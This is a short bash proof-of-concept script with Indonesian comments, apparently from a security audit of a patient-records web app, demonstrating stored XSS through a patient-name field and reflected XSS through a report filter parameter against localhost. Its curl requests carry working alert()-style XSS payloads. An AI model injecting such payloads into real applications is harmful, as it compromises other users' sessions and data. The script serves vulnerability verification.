#!/usr/bin/env bash
# PoC F-09 + F-10: stored XSS (nama pasien) dan reflected XSS (filter laporan).
# Pemakaian: BASE=http://localhost:3000 TOKEN=<jwt staff> ./06_xss.sh
set -euo pipefail
BASE="${BASE:-http://localhost:3000}"
TOKEN="${TOKEN:?set TOKEN ke JWT staf}"

echo "=== F-09: simpan nama pasien berisi script ==="
curl -s -X POST "$BASE/api/patients" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"full_name":"<img src=x onerror=alert(document.domain)>","birth_date":"2000-01-01","gender":"L","phone":"08123456789"}'
echo
echo "[i] buka /patients di browser -> payload tereksekusi (sebelum fix)"

echo
echo "=== F-10: refleksi filter pada laporan ==="
curl -s "$BASE/api/reports?filter=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E" \
  -H "Authorization: Bearer $TOKEN" | head -c 400
echo
echo "[i] buka /reports?filter=... di browser -> payload tereksekusi (sebelum fix)"
